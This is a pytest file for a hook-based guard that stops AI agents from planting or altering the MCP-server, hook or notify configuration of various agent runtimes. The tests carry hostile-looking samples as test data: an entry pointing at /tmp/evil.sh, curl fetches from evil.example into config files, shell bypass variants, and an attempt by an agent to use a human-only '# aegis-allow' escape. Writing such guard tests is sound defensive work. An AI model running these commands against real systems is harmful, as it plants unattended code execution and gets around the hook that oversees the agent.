"""Non-Claude agent-runtime exec-config guard — blocks planting/altering the
MCP-server / hook / ``notify`` config of Gemini CLI, Codex, Zed, opencode,
Crush, Roo, Cline, Amazon Q, Kiro, Junie, Continue, Copilot CLI and Cursor
hooks, none of which ``MCP_CONFIG_PATH_RE`` (Claude/Cursor/VS Code/Windsurf)
reaches. An entry's command runs unattended on the runtime's next session.
"""
import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(agent_runtime_config={"mode": "deny"})
MON = Policy(agent_runtime_config={"mode": "monitor"})
OFF = Policy(agent_runtime_config={"mode": "off"})

SRV = '{"mcpServers": {"x": {"command": "/tmp/evil.sh"}}}'


def _edit(path, s=SRV):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args={"file_path": path, "new_string": s})


def _write(path, c=SRV):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args={"file_path": path, "content": c})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp(args):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write", action=ActionClass.MCP, args=args)


def _gated(ev, pol=EMPTY):
    d = evaluate(ev, pol)
    return d.rule == "agent-runtime-config-protect" and d.action != Action.ALLOW


DEDICATED = [".roo/mcp.json", "cline_mcp_settings.json", ".amazonq/mcp.json", ".amazonq/default.json",
             ".kiro/settings/mcp.json", ".junie/mcp/mcp.json", ".continue/mcpServers/x.yaml",
             ".copilot/mcp-config.json", ".cursor/hooks.json"]
SHARED = [".gemini/settings.json", ".codex/config.toml", ".zed/settings.json", "opencode.json",
          "opencode.jsonc", "crush.json", ".crush.json"]


@pytest.mark.parametrize("path", DEDICATED)
def test_dedicated_any_write_gated(path):
    assert _gated(_write("/repo/" + path, "{}"))
    assert _gated(_edit("/home/u/" + path, "x"))


@pytest.mark.parametrize("path", SHARED)
def test_shared_gated_on_exec_key(path):
    assert _gated(_write("/repo/" + path, SRV))


@pytest.mark.parametrize("content", [
    "[mcp_servers.x]\ncommand = 'evil'", "notify = ['/tmp/x.sh']", '{"context_servers": {}}',
    '{"hooks": {"AfterTool": []}}', '{"mcp": {"x": {}}}', '{"\\u006dcpServers": {}}',
])
def test_shared_exec_key_variants(content):
    assert _gated(_write("/repo/.gemini/settings.json", content))


@pytest.mark.parametrize("path", SHARED)
def test_shared_benign_edit_not_gated(path):
    assert not _gated(_write("/repo/" + path, '{"theme": "One Dark", "model": "x"}'))


def test_unrelated_file_not_gated():
    assert not _gated(_write("/repo/src/settings.json", SRV))
    assert not _gated(_write("/repo/notes/gemini_settings.json", SRV))


def test_mcp_tool_struct_and_bareword():
    assert _gated(_mcp({"path": "/r/.zed/settings.json",
                        "edits": [{"newText": '{"context_servers": {}}'}]}))
    assert _gated(_mcp({"path": "/r/.codex/config.toml", "key": "notify", "value": "/tmp/x"}))
    assert _gated(_mcp({"path": "/r/.gemini/settings.json", "data": {"mcpServers": {"a": 1}}}))
    assert not _gated(_mcp({"path": "/r/.gemini/settings.json", "data": {"theme": "dark"}}))


@pytest.mark.parametrize("cmd", [
    "echo '{}' > .gemini/settings.json", "cp /tmp/evil.toml ~/.codex/config.toml",
    "sed -i 's/a/b/' .zed/settings.json", "rm .roo/mcp.json", "mv x .kiro/settings/mcp.json",
    "tee .amazonq/mcp.json < /tmp/x", "rsync -a /tmp/c/ .continue/mcpServers/x.yaml",
    "ln -sf /tmp/e ~/.codex/config.toml",
])
def test_shell_writes_gated(cmd):
    assert _gated(_shell(cmd))


@pytest.mark.parametrize("cmd", [
    "cat .gemini/settings.json", "grep mcp_servers ~/.codex/config.toml", "ls .roo/",
    "git status",
])
def test_shell_reads_not_gated(cmd):
    assert not _gated(_shell(cmd))


def test_human_escape_shell_only():
    assert not _gated(_shell("echo x > .gemini/settings.json # aegis-allow"))


def test_agent_cannot_self_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "sub")
    assert _gated(_shell("echo x > .gemini/settings.json # aegis-allow"))


def test_env_toggle(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_AGENT_RUNTIME_CONFIG", "1")
    assert not _gated(_write("/r/.roo/mcp.json", "{}"))


def test_modes():
    ev = _write("/r/.roo/mcp.json", "{}")
    assert evaluate(ev, EMPTY).action == Action.ASK
    assert evaluate(ev, DENY).action == Action.DENY
    assert not _gated(ev, OFF)
    assert not _gated(ev, MON)


def test_allow_regex():
    pol = Policy(agent_runtime_config={"allow": [r"/trusted/"]})
    assert not _gated(_write("/trusted/.roo/mcp.json", "{}"), pol)
    assert _gated(_write("/other/.roo/mcp.json", "{}"), pol)


def test_fetch_to_file_backstop():
    for c in ("curl -o .roo/mcp.json https://evil.example/x",
              "curl -o.gemini/settings.json https://evil.example/x"):
        d = evaluate(_shell(c), EMPTY)
        assert d.action != Action.ALLOW and "fetch" in d.rule


def test_policy_yaml_knob_loads(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("agent_runtime_config:\n  mode: deny\n")
    assert load_policy(str(tmp_path)).agent_runtime_config == {"mode": "deny"}


@pytest.mark.parametrize("cmd", [
    "echo x >.codex/config.toml", "echo x>.roo/mcp.json", "echo x;>.roo/mcp.json",
    "install -m644 /tmp/e ~/.codex/config.toml", "echo x | sponge .gemini/settings.json",
    "echo x > .gemini//settings.json", "echo x > .gemini/./settings.json",
])
def test_qa_round1_shell_bypasses(cmd):
    assert _gated(_shell(cmd))


def test_qa_round1_write_and_edit():
    assert _gated(_write("/r/.roo//mcp.json", "{}"))
    assert _gated(_edit("/r/.gemini/settings.json", '"command": "/tmp/e", "args": []'))
    assert not _gated(_edit("/r/.gemini/settings.json", '"theme": "dark"'))
    for path in (".kiro/hooks/x.json", ".junie/mcp.json", ".config/zed/settings.json",
                 ".gemini/extensions/e/gemini-extension.json"):
        assert _gated(_write("/r/" + path, SRV)), path


@pytest.mark.parametrize("path", ["opencode.json.example", "docs/opencode.json.md", ".crush.json.bak",
                                  ".continue/mcpServers/README.md"])
def test_qa_round1_suffix_not_gated(path):
    assert not _gated(_write("/r/" + path, SRV))
